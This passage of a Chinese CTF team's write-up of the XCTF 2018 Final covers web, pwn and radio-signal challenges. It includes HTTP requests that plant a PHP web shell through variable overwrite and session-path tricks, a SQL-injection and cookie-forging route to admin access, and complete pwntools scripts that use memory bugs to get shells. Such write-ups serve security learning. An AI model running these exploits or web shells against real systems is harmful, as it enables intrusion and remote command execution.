class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html:/tmp'</span>);</span><br><span class="line">    $file = <span class="string">'function.php'</span>;</span><br><span class="line">    $func = <span class="keyword">isset</span>($_GET[<span class="string">'function'</span>])?$_GET[<span class="string">'function'</span>]:<span class="string">'filters'</span>; </span><br><span class="line">    call_user_func($func,$_GET);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_POST[<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'name'</span>]==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        header(<span class="string">'location:admin.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从index.php可以看出$_GET['function'] 和 $_SESSION['name'] = $_POST['name'] 可控</p><p>其中call_user_func(<span class="math inline">\(func,\)</span>_GET);回调函数可利用 而且include($file);调用了文件包含</p><p>所以，可以调用变量覆盖函数，覆盖掉$file，从而引入文件包含 payload: http://10.99.99.16/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=./function.php</p><p>一开始只是highlight_file给出index.php的源码，利用文件包含读到了admin.php和function.php的源码，不过对解题没啥卵用。</p><p>吐槽点：早上题目的环境是php7.2，extract函数是无法动态调用的，然后中午主办方偷偷改了环境为7.0，也不发公告说一声，浪费了很多时间。</p><p>调用session_start函数，修改session的位置 从index.php可以看出$_SESSION['name'] = $_POST['name']，session的值可控，session默认的保存位置为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php5/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><p>由于ini_set('open_basedir', '/var/www/html:/tmp')，我们包含不了/var/lib/下的session</p><p>但是我在tmp下也找不到自己的session，所以这里的session应该是在/var/lib/下</p><p>这里可以调用session_start函数，修改session的位置</p><p>这里直接把session写到了web根目录，并且内容可控 再利用变量覆盖，调用文件包含，即可get shell http://10.99.99.16/index.php?function=extract&amp;file=./sess_lfc5uk0rv8ndmjfv86u9tv6fk2</p><p>payload: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?function=session_start&amp;save_path=/tmp HTTP/1.1</span><br><span class="line">Host: 10.99.99.16</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=a9tvfth9lfqabt9us85t3b07s1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">name=&lt;?php echo &quot;aaa&quot;;system($_GET[x]);?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?function=extract&amp;file=/tmp/sess_a9tvfth9lfqabt9us85t3b07s1&amp;x=cat+sdjbhudfhuahdjkasndjkasnbdfdf.php HTTP/1.1</span><br><span class="line">Host: 10.99.99.16</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=a9tvfth9lfqabt9us85t3b07s1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/babyphp_01.png"></p><blockquote><p>flag:flag{best_H4cker_in_xctf}</p></blockquote><h2><span id="pubg">PUBG</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chi ji ma？host: 159.138.2.46:8888 http://guaika.txmeili.com:8888/kss_admin/index.php</span><br><span class="line"></span><br><span class="line">hint1:先找源码，题目环境正在修复。 Try to find the source code first, the author is fixing the challenge environment.</span><br><span class="line"></span><br><span class="line">hint2:题目环境已更新http://guaika.txmeili.com:8888/a.php，验证码看不到的可以访问这个159.138.22.212; Challegen environmen has been updated, http://guaika.txmeili.com:8888/a.php, if you have problem with authorize code, please access to 159.138.22.212</span><br><span class="line">验证码在 http://guaika.txmeili.com:8888/a.php</span><br></pre></td></tr></table></figure><p>扫描目录，发现源码 http://guaika.txmeili.com:8888/www.zip</p><p>部分文件使用了ZEND/PHP5.2加密，解密工具：https://pan.baidu.com/s/1eQjnVGm ，选择“PHP 5.2 NM 解码”，解密后变量名还是有点乱，可以用 http://www.zhaoyuanma.com/phpzendfix.html 进行变量名的修复。</p><p>在/kss_inc/payapi_return.php 中发现存在SQL注入： <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_00.png"> SerialNo参数可以进行盲注： <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_01.png"> <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_02.png"></p><p>使用sqlmap可以拖出数据，需要加option --risk 3 --level 5 --string="易付通URL签名不正确" 因为在默认的risk(1)和level(1)下sqlmap会跳过对or型盲注的检测 --string的作用为 <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_03.png"></p><p>拖出数据，构造cookie获得admin权限。根据/kss_inc/db_function.php iZSVk4mLkY函数逻辑构造cookie中的kss_manager，根据/kss_inc/function.php jZKVlY6Hk函数逻辑构造cookie中的kss_manager_ver kss_manager=1,axing,8ccf03839a8c63a3a9de17fa5ac6a192,efefefef kss_manager_ver=md5(kss_manager.COOKKEY) efefefef是/kss_inc/db_function.php中的后门linecode值，COOKKEY的值可以在/kss_inc/_config.php中找到。从而我们可以登录管理后台。</p><p>接下来考虑如何getshell。在/kss_admin/中存在升级功能，</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_04.png"></p><p>跟进该函数，发现其使用了回调函数read_body</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_05.png"></p><p>read_body函数使用了file_put_contents函数将curl的返回结果写入/kss_tools/_webup.php</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_06.png"></p><p>如果我们能够控制curl的返回内容，我们就能实现getshell 我们看到url里拼接的变量是可控的：</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_07.png"></p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_08.png"></p><p>在http://api.hphu.com/test/kss_admin/index.php 有一套demo，同时，在/kss_inc/function.php可以看到SQL注入过滤函数i4mIkpO，其中对SQL敏感字符过滤的部分：</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_09.png"></p><p>可以看到，该过滤函数会将有敏感字符的部分直接回显，利用这个函数，结合可控的拼接到url的变量，我们可以控制curl http://api.hphu.com 某个文件的返回内容getshell</p><p>那么，我们全局查找一下使用了该函数的文件，发现很多文件都用了该函数，例如/kss_admin/admin_logs.php</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_10.png"></p><p>尝试构造：</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_11.png"></p><p>写shell：</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_12.png"></p><p>getflag：</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Web/PUBG_13.png"></p><blockquote><p>flag:flag{<span class="citation" data-cites="_n1ce_s1ng">@_n1ce_s1ng</span><span class="citation" data-cites="p0r3_tr1p_">@p0r3_tr1p_</span>:)}</p></blockquote><blockquote><p>PS:附上队内@aye 师傅的Web wp： baby php：https://www.jianshu.com/p/7d63eca80686 PUBG：https://www.jianshu.com/p/bad7af1a631c</p></blockquote><h1><span id="pwn">Pwn</span></h1><h2><span id="nobof">nobof</span></h2><p>nc 10.99.99.16 29999</p><p>这道题是用clang编译的，用了safestack</p><p>审了一遍，发现get_int函数能在safestack上面溢出，但是并没有什么用，利用不了</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Pwn/nobuf_00.png"></p><p>menu这个格式化字符串漏洞非常明显，但是只能用来leak，因为检测了有没有n这个字母</p><p>最后审出来的是下标溢出漏洞，基本存在于每个有用到下标的地方</p><p>我们用update来解释下</p><p><img src="hhttps://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Pwn/nobuf_01.png"></p><p>首先get_int会读取一个数字，然后判断是否大于256，但是v1其实是可以为负数</p><p>例如v1 = 0xf0000001，这个在程序里面判断的是一个小于0的数</p><p>然后在下面&amp;books[64 * v1 + 2] 这个地方</p><p>v1*64= 0xf0000001 &lt;&lt;8 = 0x00000100</p><p>这样就能bypass它的v1&lt;256这个检查</p><p>那么能用来干什么呢？</p><p>很明显可以去写libc的malloc_hook或者free_hook，还可以去写栈，直接rop</p><p>最后选择了直接去写栈，不过因为栈地址会变，所以我限制了一下栈地址的范围，不然写着写着会报错</p><p>下面是简单的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./no-bof'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    e=ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'10.99.99.16'</span>, <span class="number">29999</span>)</span><br><span class="line">    e=ELF(<span class="string">'./x32_libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Your input: '</span>)</span><br><span class="line">sl(<span class="string">'4 %47$p%26$p'</span>)</span><br><span class="line">ru(<span class="string">'Your choice is:4 '</span>)</span><br><span class="line">data=ru(<span class="string">'&amp;#92;n'</span>)</span><br><span class="line">ru(<span class="string">'Your input: '</span>)</span><br><span class="line"></span><br><span class="line">libc=int(data[:<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">stack=int(data[<span class="number">10</span>:<span class="number">20</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    base=libc<span class="number">-0x18637</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    base=libc<span class="number">-0x19AD3</span></span><br><span class="line">book=<span class="number">0x84978E4</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">binsh=base+e.search('/bin/sh').next()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">offset=(binsh-book)&amp;gt;&amp;gt;8</span></span><br><span class="line"><span class="string">offset+=0</span></span><br><span class="line"><span class="string">target=book+offset*0x100+8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">offset+=0xf0000000</span></span><br><span class="line"><span class="string">offset=offset-0x100000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(hex(target))</span></span><br><span class="line"><span class="string">print(hex(binsh))</span></span><br><span class="line"><span class="string">print(hex(target-base))</span></span><br><span class="line"><span class="string">print(hex(base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sl('5')</span></span><br><span class="line"><span class="string">ru('which book do you want to print?')</span></span><br><span class="line"><span class="string">sl(str(offset))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">offset=(stack-book)&amp;gt;&amp;gt;<span class="number">8</span></span><br><span class="line"></span><br><span class="line">target=book+offset*<span class="number">0x100</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> stack-target&amp;lt;<span class="number">0x2c</span> <span class="keyword">or</span> stack-target&amp;gt;<span class="number">0x5c</span>:</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset+=<span class="number">0xf0000000</span></span><br><span class="line">offset=offset<span class="number">-0x100000000</span></span><br><span class="line"></span><br><span class="line">binsh=base+e.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system=base+e.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">ru(<span class="string">'which book do you want to update?'</span>)</span><br><span class="line">sl(str(offset))</span><br><span class="line">ru(<span class="string">'Book title: '</span>)</span><br><span class="line">sl(<span class="string">'&amp;#92;x00'</span>*(stack<span class="number">-0x2c</span>-target)+p32(system)+p32(binsh)*<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">'Book price: '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="reader">reader</span></h2><p>nc 10.99.99.16 19999</p><p>这道题感觉有点坑爹，首先随便审了一下main函数，发现好像有一个任意执行</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Pwn/reader_00.png"></p><p>但是后面却发现，这里根本利用不了........</p><p>题目有这些功能</p><ol type="1"><li>input original raw text</li><li>input paper form text</li><li>input book form text</li><li>export book to paper</li><li>export paper to book</li><li>proofread input material with raw text</li><li>delete</li><li>show file</li></ol><p>下面来解释一下这些功能</p><p><strong>input original raw text</strong></p><p>简单的读255字节到bss段</p><p><strong>input paper form text</strong></p><p>选择写入哪一个paper，然后读取</p><p>content: 255个字节 title: 31个字节 description: 127个字节</p><p>再用strlen来得到content的长度，写进结构体的第四个字节处</p><p>** input book form text**</p><p>选择写入哪一个book，然后读取</p><p>content: 255个字节 title: 31个字节 description: 255个字节</p><p>再用strlen来得到content的长度，写进结构体的第四个字节处</p><p><strong>export book to paper</strong></p><p>选择将哪个book复制到哪个paper</p><p>具体是，将book的content的size写到paper的content的size处</p><p>然后 memcpy( paper's content, book's content, 0xff); memcpy( paper's title, book's title, 0xff); memcpy( paper's description, book's description, 0xff);</p><p>这里就漏洞的所在点，这里能溢出到下一个paper的size和content</p><p><strong>export paper to book</strong></p><p>和上一个功能差不多，不多说了</p><p><strong>proofread input material with raw text</strong></p><p>首先计算了某个paper或book的content和 raw_content有前多少个字节相等</p><p>然后让你猜大概前多少个字节相等</p><p>假如你猜的前n个字节是相等的，那么它就会用strncmp来判断，返回的结果是相等的话，就会打印栈上读进来content的前n个字节</p><p>这里的漏洞就是利用了strncmp是用于字符串判断相等的，假如我们content和raw content 都是空的，这里也会返回判断相等</p><p>但是n的话可以是一个很大的数，这样就能leak出栈上的内容</p><p><strong>delete</strong></p><p>首先会在栈上开辟book或paper结构体大小的空间</p><p>然后再memcpy到上面，最后memset原来的内存</p><p><img src="http://pro.leanote.com/file/image/5bdd668757926df60c0d700c"></p><p>但是这里它忘记判断content的size的大小，直接就memcpy上去了，所以就造成栈溢出了</p><p>所以利用链大概是</p><ol type="1"><li>leak出栈上有用的信息</li><li>溢出改paper的content size位</li><li>写rop链到下一个paper</li><li>delete被改size位的paper，get shell</li></ol><p>下面是比赛的时候写的payload，可能不太简洁，凑合着看吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./reder'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'10.99.99.16'</span>,<span class="number">19999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_raw</span><span class="params">(x)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'please input your raw text'</span>)</span><br><span class="line">    sl(x)</span><br><span class="line">    ru(<span class="string">'&amp;gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inn</span><span class="params">(idx,id,content,title,desc)</span>:</span></span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Where you want to edit/input?'</span>)</span><br><span class="line">    sl(str(id))</span><br><span class="line">    ru(<span class="string">'please input content'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'input your title'</span>)</span><br><span class="line">    se(title)</span><br><span class="line">    ru(<span class="string">'input your description&amp;#92;n&amp;gt;'</span>)</span><br><span class="line">    se(desc)</span><br><span class="line">    ru(<span class="string">'&amp;gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export</span><span class="params">(idx,id1,id2)</span>:</span></span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Which book you want to export'</span>)</span><br><span class="line">    sl(str(id1))</span><br><span class="line">    ru(<span class="string">'where you want to output'</span>)</span><br><span class="line">    sl(str(id2))</span><br><span class="line">    ru(<span class="string">'&amp;gt;'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mexit</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'q'</span>)</span><br><span class="line">    ru(<span class="string">'Are you sure you want to exit?(y/n)'</span>)</span><br><span class="line">    sl(<span class="string">'n'</span>)</span><br><span class="line">    ru(<span class="string">'&amp;gt;'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'6'</span>)</span><br><span class="line">ru(<span class="string">'what do you want to proofread?'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'which one you want to proofread?'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'how many words you assume are same?'</span>)</span><br><span class="line">sl(<span class="string">'400'</span>)</span><br><span class="line">ru(<span class="string">'&amp;#92;x00'</span>*<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">data=ru(<span class="string">'&amp;#92;n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">pbase=u64(data[:<span class="number">8</span>])<span class="number">-0x138F</span></span><br><span class="line"></span><br><span class="line">libc=u64(data[<span class="number">-8</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    base=libc<span class="number">-0x20830</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    base=libc<span class="number">-0x21F45</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&amp;gt;'</span>)</span><br><span class="line"></span><br><span class="line">inn(<span class="number">3</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0xff</span>,<span class="string">'b'</span>*<span class="number">0x1f</span>,<span class="string">'c'</span>*<span class="number">0x80</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x300</span>)+cyclic(<span class="number">0x77</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inn(<span class="number">2</span>,<span class="number">2</span>,cyclic(<span class="number">1</span>),<span class="string">'q'</span>*<span class="number">0x1f</span>,cyclic(<span class="number">1</span>))</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">120</span>+p64(pbase+<span class="number">0x203000</span>+<span class="number">0x100</span>)+cyclic(<span class="number">8</span>)+p64(pbase+<span class="number">0x203000</span>+<span class="number">0x100</span>)+<span class="string">'a'</span>*<span class="number">8</span>+p64(base+<span class="number">0x4647c</span>)</span><br><span class="line"></span><br><span class="line">inn(<span class="number">3</span>,<span class="number">3</span>,cyclic(<span class="number">0xff</span>),<span class="string">'b'</span>*<span class="number">0x1f</span>,payload)</span><br><span class="line">export(<span class="number">4</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">export(<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'7'</span>)</span><br><span class="line">ru(<span class="string">'what do you want to delete?'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'which one you want to delete?'</span>)</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">print(hex(pbase))</span><br><span class="line">print(hex(libc))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="misc">Misc</span></h1><h2><span id="mysterious-signals">Mysterious signals</span></h2><p>hint:无线射频频谱 radio frequency spectrum</p><p>使用cool edit pro2打开文件,在"查看"一栏选择"光谱显示窗"即可看到flag <img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Misc/Mysterious_00.png"></p><blockquote><p>flag:flag{756e69636f726e}</p></blockquote><h2><span id="核弹遥控器密码">核弹遥控器密码</span></h2><p>hint:芯片型号pt2242,24位有效数据 pt2242 chipset, 24 bits of valid data</p><p>pt2242是固定码芯片</p><p>通过inspectrum(<a href="https://github.com/miek/inspectrum" target="_blank" rel="noopener">https://github.com/miek/inspectrum</a>)这个工具来分析信号</p><p>结合https://www.freebuf.com/articles/wireless/146781.html 教程，可以调出：</p><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/XCTF2018_Final_wp/Misc/N-bomb_00.png"></p><p>其中，高电平长的为1，低电平长的为0</p><p>00000001011110100101100 转16进制为flag，17A59 吐槽一下，一开始出题人没说flag是16进制大写，害得我们试了好久，还以为方法错了 &gt;flag:17A59</p><h2><span id="诡异的校验">诡异的校验</span></h2><p>捕获到一份受干扰的信号文件，万幸的是被干扰的部分只是数据校验部位，必须要根据仅剩的信号还原出全部数据（十六进制）</p><p>hint1:http://ingelect.esy.es/pdf/FXTH871x7.pdf 20959185b1115208(射频文件解码后的数据) http://ingelect.esy.es/pdf/FXTH871x7.pdf 20959185b1115208(data of decoded spectrum file) hint2:We have updated the challenge information, add English description as below: We captured a disturbed signal file, fortunately, only the checksum has been disturbed, you 